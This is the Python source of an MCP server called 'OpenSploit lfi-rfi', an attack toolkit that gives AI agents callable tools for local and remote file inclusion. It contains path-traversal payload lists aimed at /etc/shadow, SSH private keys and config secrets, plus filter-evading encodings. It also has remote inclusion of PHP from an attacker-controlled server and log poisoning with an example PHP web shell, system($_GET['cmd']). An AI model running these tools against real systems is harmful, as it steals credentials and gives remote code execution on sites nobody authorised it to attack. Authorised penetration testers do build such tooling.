#!/usr/bin/env python3
"""
OpenSploit MCP Server: lfi-rfi

Local File Inclusion (LFI) and Remote File Inclusion (RFI) testing tool.
Tests for path traversal, file inclusion, and related vulnerabilities.
"""

import asyncio
import base64
import re
import ssl
import urllib.request
import urllib.error
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse, urlencode, quote

from mcp_common import BaseMCPServer, ToolResult, ToolError


class LFIRFIServer(BaseMCPServer):
    """MCP server for LFI/RFI vulnerability testing."""

    # Common LFI payloads
    LFI_PAYLOADS = {
        "linux": [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/hostname",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/version",
            "/var/log/auth.log",
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/log/nginx/access.log",
            "/var/log/nginx/error.log",
            "/home/*/.ssh/id_rsa",
            "/home/*/.bash_history",
            "/root/.ssh/id_rsa",
            "/root/.bash_history",
        ],
        "windows": [
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\Windows\\win.ini",
            "C:\\Windows\\system.ini",
            "C:\\boot.ini",
            "C:\\inetpub\\logs\\LogFiles",
            "C:\\xampp\\apache\\logs\\access.log",
            "C:\\xampp\\apache\\logs\\error.log",
        ],
        "web": [
            ".htaccess",
            "web.config",
            "config.php",
            "wp-config.php",
            "configuration.php",
            ".env",
            "composer.json",
            "package.json",
        ],
    }

    # Traversal encodings
    TRAVERSAL_ENCODINGS = {
        "plain": "../",
        "url": "%2e%2e%2f",
        "double-url": "%252e%252e%252f",
        "utf8": "%c0%ae%c0%ae%c0%af",
        "backslash": "..\\",
        "url-backslash": "%2e%2e%5c",
        "mixed": "..%2f",
        "null-byte": "../%00",
    }

    def __init__(self):
        super().__init__(
            name="lfi-rfi",
            description="Local/Remote File Inclusion vulnerability testing",
            version="1.0.0",
        )

        self.register_method(
            name="test_lfi",
            description="Test URL parameter for Local File Inclusion vulnerability",
            params={
                "url": {
                    "type": "string",
                    "required": True,
                    "description": "Target URL with {PAYLOAD} placeholder (e.g., http://target/page?file={PAYLOAD})",
                },
                "os": {
                    "type": "enum",
                    "values": ["linux", "windows", "auto"],
                    "default": "auto",
                    "description": "Target operating system",
                },
                "depth": {
                    "type": "integer",
                    "default": 8,
                    "description": "Maximum directory traversal depth",
                },
                "encodings": {
                    "type": "array",
                    "description": "Encodings to try (default: all)",
                },
                "cookie": {
                    "type": "string",
                    "description": "Cookie header for authenticated testing",
                },
                "headers": {
                    "type": "object",
                    "description": "Custom HTTP headers",
                },
                "success_pattern": {
                    "type": "string",
                    "description": "Regex pattern indicating successful inclusion",
                },
                "timeout": {
                    "type": "integer",
                    "default": 10,
                    "description": "Request timeout per attempt",
                },
            },
            handler=self.test_lfi,
        )

        self.register_method(
            name="test_rfi",
            description="Test URL parameter for Remote File Inclusion vulnerability",
            params={
                "url": {
                    "type": "string",
                    "required": True,
                    "description": "Target URL with {PAYLOAD} placeholder",
                },
                "remote_url": {
                    "type": "string",
                    "required": True,
                    "description": "URL to include (your controlled server)",
                },
                "wrappers": {
                    "type": "array",
                    "description": "PHP wrappers to try (default: common wrappers)",
                },
                "cookie": {
                    "type": "string",
                    "description": "Cookie header for authenticated testing",
                },
                "headers": {
                    "type": "object",
                    "description": "Custom HTTP headers",
                },
                "timeout": {
                    "type": "integer",
                    "default": 10,
                    "description": "Request timeout",
                },
            },
            handler=self.test_rfi,
        )

        self.register_method(
            name="read_file",
            description="Read a specific file via confirmed LFI vulnerability",
            params={
                "url": {
                    "type": "string",
                    "required": True,
                    "description": "Vulnerable URL with {PAYLOAD} placeholder",
                },
                "file_path": {
                    "type": "string",
                    "required": True,
                    "description": "File to read (e.g., /etc/passwd)",
                },
                "traversal": {
                    "type": "string",
                    "default": "../",
                    "description": "Traversal string that works",
                },
                "depth": {
                    "type": "integer",
                    "default": 8,
                    "description": "Traversal depth",
                },
                "wrapper": {
                    "type": "string",
                    "description": "PHP wrapper (e.g., php://filter/convert.base64-encode/resource=)",
                },
                "cookie": {
                    "type": "string",
                    "description": "Cookie header",
                },
                "headers": {
                    "type": "object",
                    "description": "Custom HTTP headers",
                },
                "timeout": {
                    "type": "integer",
                    "default": 15,
                    "description": "Request timeout",
                },
            },
            handler=self.read_file,
        )

        self.register_method(
            name="php_filter",
            description="Use PHP filter wrapper to read file contents (base64 encoded)",
            params={
                "url": {
                    "type": "string",
                    "required": True,
                    "description": "Vulnerable URL with {PAYLOAD} placeholder",
                },
                "file_path": {
                    "type": "string",
                    "required": True,
                    "description": "File to read",
                },
                "cookie": {
                    "type": "string",
                    "description": "Cookie header",
                },
                "headers": {
                    "type": "object",
                    "description": "Custom HTTP headers",
                },
                "timeout": {
                    "type": "integer",
                    "default": 15,
                    "description": "Request timeout",
                },
            },
            handler=self.php_filter,
        )

        self.register_method(
            name="log_poison",
            description="Attempt log poisoning via User-Agent or other headers",
            params={
                "url": {
                    "type": "string",
                    "required": True,
                    "description": "Vulnerable URL with {PAYLOAD} placeholder",
                },
                "log_file": {
                    "type": "string",
                    "required": True,
                    "description": "Log file path (e.g., /var/log/apache2/access.log)",
                },
                "payload": {
                    "type": "string",
                    "required": True,
                    "description": "Payload to inject (e.g., <?php system($_GET['cmd']); ?>)",
                },
                "traversal": {
                    "type": "string",
                    "default": "../",
                    "description": "Traversal string",
                },
                "depth": {
                    "type": "integer",
                    "default": 8,
                    "description": "Traversal depth",
                },
                "poison_header": {
                    "type": "enum",
                    "values": ["User-Agent", "Referer", "X-Forwarded-For"],
                    "default": "User-Agent",
                    "description": "Header to poison",
                },
                "cookie": {
                    "type": "string",
                    "description": "Cookie header",
                },
                "timeout": {
                    "type": "integer",
                    "default": 15,
                    "description": "Request timeout",
                },
            },
            handler=self.log_poison,
        )

    def _make_request(
        self,
        url: str,
        headers: Optional[Dict[str, str]] = None,
        cookie: Optional[str] = None,
        timeout: int = 10,
    ) -> Dict[str, Any]:
        """Make HTTP request."""
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        req_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        }
        if headers:
            req_headers.update(headers)
        if cookie:
            req_headers["Cookie"] = cookie

        request = urllib.request.Request(url, headers=req_headers)

        try:
            response = urllib.request.urlopen(request, timeout=timeout, context=ctx)
            body = response.read().decode('utf-8', errors='replace')
            return {
                "status_code": response.status,
                "body": body,
                "success": True,
            }
        except urllib.error.HTTPError as e:
            body = e.read().decode('utf-8', errors='replace') if e.fp else ""
            return {
                "status_code": e.code,
                "body": body,
                "success": False,
            }
        except Exception as e:
            return {
                "status_code": 0,
                "body": "",
                "success": False,
                "error": str(e),
            }

    def _build_traversal(self, depth: int, encoding: str = "plain") -> str:
        """Build traversal string with encoding."""
        base = self.TRAVERSAL_ENCODINGS.get(encoding, "../")
        return base * depth

    def _detect_lfi_success(self, body: str, target_file: str, pattern: Optional[str] = None) -> bool:
        """Detect if LFI was successful."""
        if pattern:
            return bool(re.search(pattern, body))

        # Common success indicators
        indicators = {
            "/etc/passwd": r"root:.*:0:0:",
            "/etc/shadow": r"root:\$",
            "/etc/hosts": r"127\.0\.0\.1\s+localhost",
            "/proc/self/environ": r"(PATH|HOME|USER)=",
            "/proc/version": r"Linux version",
            "win.ini": r"\[fonts\]",
            "hosts": r"127\.0\.0\.1",
        }

        for file_hint, regex in indicators.items():
            if file_hint in target_file.lower():
                if re.search(regex, body, re.IGNORECASE):
                    return True

        # Generic check - file content present
        if len(body) > 100 and "not found" not in body.lower() and "error" not in body.lower():
            return True

        return False

    async def test_lfi(
        self,
        url: str,
        os: str = "auto",
        depth: int = 8,
        encodings: Optional[List[str]] = None,
        cookie: Optional[str] = None,
        headers: Optional[Dict[str, str]] = None,
        success_pattern: Optional[str] = None,
        timeout: int = 10,
    ) -> ToolResult:
        """Test for LFI vulnerability."""
        self.logger.info(f"Testing LFI on {url}")

        if "{PAYLOAD}" not in url:
            return ToolResult(
                success=False,
                data={},
                error="URL must contain {PAYLOAD} placeholder",
            )

        # Determine OS-specific payloads
        if os == "auto":
            test_files = self.LFI_PAYLOADS["linux"] + self.LFI_PAYLOADS["windows"]
        else:
            test_files = self.LFI_PAYLOADS.get(os, self.LFI_PAYLOADS["linux"])

        # Encodings to try
        if encodings is None:
            encodings = list(self.TRAVERSAL_ENCODINGS.keys())

        vulnerabilities = []
        tested = 0

        # Test common files with different traversal depths and encodings
        for target_file in test_files[:10]:  # Limit to first 10 files
            for encoding in encodings[:4]:  # Limit encodings
                for d in [depth, depth - 2, depth + 2]:
                    if d < 1:
                        continue

                    traversal = self._build_traversal(d, encoding)
                    payload = traversal + target_file.lstrip("/")
                    test_url = url.replace("{PAYLOAD}", quote(payload, safe=""))

                    response = self._make_request(test_url, headers, cookie, timeout)
                    tested += 1

                    if self._detect_lfi_success(response["body"], target_file, success_pattern):
                        vulnerabilities.append({
                            "file": target_file,
                            "payload": payload,
                            "encoding": encoding,
                            "depth": d,
                            "url": test_url,
                            "status_code": response["status_code"],
                            "body_preview": response["body"][:500],
                        })
                        # Found one, move to next file
                        break
                else:
                    continue
                break

        return ToolResult(
            success=len(vulnerabilities) > 0,
            data={
                "vulnerable": len(vulnerabilities) > 0,
                "vulnerabilities": vulnerabilities,
                "tested": tested,
                "working_payload": vulnerabilities[0]["payload"] if vulnerabilities else None,
                "working_encoding": vulnerabilities[0]["encoding"] if vulnerabilities else None,
            },
            raw_output=f"Found {len(vulnerabilities)} LFI vulnerabilities" if vulnerabilities else "No LFI vulnerability found",
        )

    async def test_rfi(
        self,
        url: str,
        remote_url: str,
        wrappers: Optional[List[str]] = None,
        cookie: Optional[str] = None,
        headers: Optional[Dict[str, str]] = None,
        timeout: int = 10,
    ) -> ToolResult:
        """Test for RFI vulnerability."""
        self.logger.info(f"Testing RFI on {url} with {remote_url}")

        if "{PAYLOAD}" not in url:
            return ToolResult(
                success=False,
                data={},
                error="URL must contain {PAYLOAD} placeholder",
            )

        # RFI wrappers/methods
        if wrappers is None:
            wrappers = [
                "",  # Direct
                "http://",
                "https://",
                "ftp://",
                "data://text/plain;base64,",
                "expect://",
            ]

        vulnerabilities = []

        for wrapper in wrappers:
            if wrapper.startswith("data://"):
                # Base64 encode the remote URL reference
                payload = wrapper + base64.b64encode(f"<?php include('{remote_url}'); ?>".encode()).decode()
            elif wrapper in ["", "http://", "https://", "ftp://"]:
                if wrapper and not remote_url.startswith(("http://", "https://", "ftp://")):
                    payload = wrapper + remote_url
                else:
                    payload = remote_url
            else:
                payload = wrapper + remote_url

            test_url = url.replace("{PAYLOAD}", quote(payload, safe=""))
            response = self._make_request(test_url, headers, cookie, timeout)

            # Check for inclusion indicators
            if response["status_code"] == 200 and len(response["body"]) > 0:
                vulnerabilities.append({
                    "wrapper": wrapper or "direct",
                    "payload": payload,
                    "url": test_url,
                    "status_code": response["status_code"],
                    "body_length": len(response["body"]),
                })

        return ToolResult(
            success=len(vulnerabilities) > 0,
            data={
                "vulnerable": len(vulnerabilities) > 0,
                "vulnerabilities": vulnerabilities,
                "note": "Verify by checking if your remote server received a request",
            },
            raw_output=f"Potential RFI: {len(vulnerabilities)} wrappers may work" if vulnerabilities else "No RFI found",
        )

    async def read_file(
        self,
        url: str,
        file_path: str,
        traversal: str = "../",
        depth: int = 8,
        wrapper: Optional[str] = None,
        cookie: Optional[str] = None,
        headers: Optional[Dict[str, str]] = None,
        timeout: int = 15,
    ) -> ToolResult:
        """Read file via LFI."""
        self.logger.info(f"Reading {file_path} via LFI")

        if "{PAYLOAD}" not in url:
            return ToolResult(
                success=False,
                data={},
                error="URL must contain {PAYLOAD} placeholder",
            )

        # Build payload
        traversal_str = traversal * depth
        if wrapper:
            payload = wrapper + file_path
        else:
            payload = traversal_str + file_path.lstrip("/")

        test_url = url.replace("{PAYLOAD}", quote(payload, safe=""))
        response = self._make_request(test_url, headers, cookie, timeout)

        success = response["status_code"] == 200 and len(response["body"]) > 0

        return ToolResult(
            success=success,
            data={
                "file_path": file_path,
                "payload": payload,
                "url": test_url,
                "status_code": response["status_code"],
                "content": response["body"][:100000],
                "content_length": len(response["body"]),
            },
            raw_output=response["body"][:5000] if success else "Failed to read file",
        )

    async def php_filter(
        self,
        url: str,
        file_path: str,
        cookie: Optional[str] = None,
        headers: Optional[Dict[str, str]] = None,
        timeout: int = 15,
    ) -> ToolResult:
        """Use PHP filter to read and decode file."""
        self.logger.info(f"Using PHP filter to read {file_path}")

        if "{PAYLOAD}" not in url:
            return ToolResult(
                success=False,
                data={},
                error="URL must contain {PAYLOAD} placeholder",
            )

        # PHP filter wrapper for base64 encoding
        payload = f"php://filter/convert.base64-encode/resource={file_path}"
        test_url = url.replace("{PAYLOAD}", quote(payload, safe=""))

        response = self._make_request(test_url, headers, cookie, timeout)

        # Try to find and decode base64 content
        decoded_content = None
        body = response["body"]

        # Look for base64 string in response
        b64_pattern = r'([A-Za-z0-9+/]{20,}={0,2})'
        matches = re.findall(b64_pattern, body)

        for match in matches:
            try:
                decoded = base64.b64decode(match).decode('utf-8', errors='replace')
                if len(decoded) > 10:
                    decoded_content = decoded
                    break
            except:
                continue

        success = decoded_content is not None

        return ToolResult(
            success=success,
            data={
                "file_path": file_path,
                "payload": payload,
                "url": test_url,
                "status_code": response["status_code"],
                "base64_content": matches[0] if matches else None,
                "decoded_content": decoded_content[:50000] if decoded_content else None,
                "content_length": len(decoded_content) if decoded_content else 0,
            },
            raw_output=decoded_content[:5000] if success else "Failed to decode file content",
        )

    async def log_poison(
        self,
        url: str,
        log_file: str,
        payload: str,
        traversal: str = "../",
        depth: int = 8,
        poison_header: str = "User-Agent",
        cookie: Optional[str] = None,
        timeout: int = 15,
    ) -> ToolResult:
        """Attempt log poisoning."""
        self.logger.info(f"Attempting log poisoning on {log_file}")

        if "{PAYLOAD}" not in url:
            return ToolResult(
                success=False,
                data={},
                error="URL must contain {PAYLOAD} placeholder",
            )

        # Step 1: Make request with payload in header to poison log
        poison_headers = {poison_header: payload}
        if cookie:
            poison_headers["Cookie"] = cookie

        # Make a request to add our payload to logs
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}/"
        self._make_request(base_url, poison_headers, timeout=timeout)

        # Step 2: Include the log file
        traversal_str = traversal * depth
        lfi_payload = traversal_str + log_file.lstrip("/")
        test_url = url.replace("{PAYLOAD}", quote(lfi_payload, safe=""))

        response = self._make_request(test_url, cookie=cookie, timeout=timeout)

        # Check if our payload appears in the response
        success = payload in response["body"] or "<?php" in response["body"]

        return ToolResult(
            success=success,
            data={
                "log_file": log_file,
                "payload": payload,
                "poison_header": poison_header,
                "lfi_payload": lfi_payload,
                "url": test_url,
                "status_code": response["status_code"],
                "payload_visible": payload in response["body"],
                "body_preview": response["body"][:2000],
            },
            raw_output="Log poisoning may have worked - check response" if success else "Log poisoning failed",
        )


if __name__ == "__main__":
    LFIRFIServer.main()
